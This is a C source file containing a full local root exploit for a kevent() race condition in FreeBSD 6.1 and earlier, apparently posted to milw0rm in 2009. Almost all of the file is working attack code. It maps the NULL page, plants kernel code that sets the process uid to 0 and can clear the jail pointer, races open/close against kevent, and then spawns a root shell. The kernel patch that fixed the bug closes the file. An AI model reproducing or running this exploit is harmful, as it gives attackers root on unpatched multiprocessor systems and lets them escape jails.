/*
FreeBSD <= 6.1 suffers from classical check/use race condition on SMP
systems in kevent() syscall, leading to kernel mode NULL pointer
dereference. It can be triggered by spawning two threads:
1st thread looping on open() and close() syscalls, and the 2nd thread
looping on kevent(), trying to add possibly invalid filedescriptor. 

The bug was fixed in 6.1-STABLE, just before release of 6.2-RELEASE, but
was not recognized as security vulnerability.

The following code exploits this vulnerability to run root shell.
*/

/* 22.08.2009, babcia padlina 
 * FreeBSD kevent() race condition exploit
 * 
 * works only on multiprocessor systems
 * gcc -o padlina padlina.c -lpthread
 * -DPRISON_BREAK if you want to exit from jail
 *
 * with thanks to Pawel Pisarczyk for in-depth ia-32 architecture discussion 
 */

#define _KERNEL

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/event.h>
#include <sys/timespec.h>
#include <pthread.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/param.h>
#include <sys/linker.h>
#include <sys/proc.h>

int fd, kq;
struct kevent kev, ke;
struct timespec timeout;
volatile int gotroot = 0;

static void kernel_code(void) {
	struct thread *thread;
	gotroot = 1;
	asm(
		"movl %%fs:0, %0"
		: "=r"(thread)
	);
	thread->td_proc->p_ucred->cr_uid = 0;
#ifdef PRISON_BREAK
	thread->td_proc->p_ucred->cr_prison = NULL;
#endif
	return;
}

static void code_end(void) {
	return;
}

void do_thread(void) {
	usleep(100);

	while (!gotroot) {
		memset(&kev, 0, sizeof(kev));
		EV_SET(&kev, fd, EVFILT_VNODE, EV_ADD, 0, 0, NULL);

		if (kevent(kq, &kev, 1, &ke, 1, &timeout) < 0)
			perror("kevent");
	}

	return;
}

void do_thread2(void) {
	while(!gotroot) {
		if ((fd = open("/tmp/.padlina", O_RDWR | O_CREAT, 0600)) < 0)
			perror("open");

		close(fd);
	}

	return;
}

int main(void) {
	int i;
	pthread_t pth, pth2;

	if (mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) < 0) {
		perror("mmap");
		return -1;
	}

	memcpy(0, &kernel_code, &code_end - &kernel_code);

	if ((kq = kqueue()) < 0) {
		perror("kqueue");
		return -1;
	}

	pthread_create(&pth, NULL, (void *)do_thread, NULL);
	pthread_create(&pth2, NULL, (void *)do_thread2, NULL);

	timeout.tv_sec = 0;
	timeout.tv_nsec = 1;

	printf("waiting for root...\n");
	i = 0;

	while (!gotroot && i++ < 10000)
		usleep(100);

	setuid(0);

	if (getuid()) {
		printf("failed - system patched or not MP\n");
		return -1;
	}

	printf("hwdp!\n");

	execl("/bin/sh", "sh", NULL);

	return 0;
}


/*
Patch for this vulnerability, as in CVS:

--- src/sys/kern/kern_descrip.c	2006/09/04 10:30:09	1.279.2.8
+++ src/sys/kern/kern_descrip.c	2006/09/29 18:30:48	1.279.2.9
@@ -35,7 +35,7 @@
  */
 
 #include <sys/cdefs.h>
-__FBSDID("$FreeBSD: /usr/local/www/cvsroot/FreeBSD/src/sys/kern/kern_descrip.c,v 1.279.2.8 2006/09/04 10:30:09 pjd Exp $");
+__FBSDID("$FreeBSD: /usr/local/www/cvsroot/FreeBSD/src/sys/kern/kern_descrip.c,v 1.279.2.9 2006/09/29 18:30:48 jmg Exp $");
 
 #include "opt_compat.h"
 #include "opt_ddb.h"
@@ -2602,7 +2602,7 @@ static int
 badfo_kqfilter(struct file *fp, struct knote *kn)
 {
 
-	return (0);
+	return (EBADF);
 }
 
 static int
*/

// milw0rm.com [2009-08-24]